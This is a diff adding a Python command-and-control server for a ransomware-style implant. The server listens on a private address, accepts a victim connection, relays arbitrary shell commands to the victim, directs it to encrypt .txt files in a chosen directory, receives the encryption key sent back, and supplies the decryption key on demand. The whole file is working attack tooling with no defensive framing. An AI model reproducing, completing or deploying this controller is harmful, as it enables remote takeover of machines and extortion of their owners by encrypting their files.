@@ -1,0 +1,85 @@
+import socket
+import time  
+import ast
+import os
+import subprocess
+import platform
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
+
+def handle_client(client_socket):
+    print("Client connected. You can start sending commands.")
+    client_os = client_socket.recv(1024).decode("utf-8")
+    print(f"Client OS: {client_os}")
+    files_to_encrypt = []  
+
+    try:
+        while True:
+            command = input("Enter command (encrypt, decrypt, or arbitrary command, or 'exit'): ")
+
+            if command.lower() == 'exit':
+                client_socket.send(command.encode()) 
+                break
+
+            elif command.lower() == 'encrypt':
+                client_socket.send('encrypt'.encode())
+                directory = input("Enter the directory to search for .txt files: ")
+                client_socket.send(directory.encode())  
+
+                response = client_socket.recv(4096).decode("utf-8")
+                print("Response from client:\n", response)
+
+                if response.startswith("Found"):
+                    files_to_encrypt = ast.literal_eval(response.split(":", 1)[1].strip()) 
+                    print(f"Parsed files_to_encrypt: {files_to_encrypt}")
+                else:
+                    print("No files found to encrypt.")
+                    continue    
+                #encrypt_result = client_socket.recv(4096).decode("utf-8")  
+                #if encrypt_result.startswith("Failed"):
+                #    print("File encryption failed.")
+                #    break
+
+                notification = client_socket.recv(1024).decode("utf-8")
+                if notification == "KEY":
+                    key = client_socket.recv(32)
+                    print(f"Encryption key received: {key.hex()}")
+                elif notification == "NO_KEY":
+                    print("No encryption key received. Encryption process aborted.")
+                elif notification.startswith("Failed"):
+                    print("File encryption failed.")
+                else:
+                    print("Unexpected response from client:",notification)
+            elif command.lower() == 'decrypt':
+                client_socket.send('decrypt'.encode())
+
+                key = input("Enter the decryption key (in hex): ")
+                key_bytes = bytes.fromhex(key)
+
+                client_socket.send(key_bytes)  
+
+            else:
+                client_socket.send(command.encode())
+                response = client_socket.recv(4096).decode("utf-8")
+                print("Response from client:\n", response)
+
+    except Exception as e:
+        print(f"Error: {e}")
+
+    finally:
+        client_socket.close()
+
+def start_server():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(('192.168.30.19', 9999))
+    server_socket.listen(5)
+    
+    print("Server waiting for client connection...")
+
+    client_socket, client_address = server_socket.accept()
+    print(f"Connection established with {client_address}")
+    handle_client(client_socket)
+
+if __name__ == "__main__":
+    start_server()
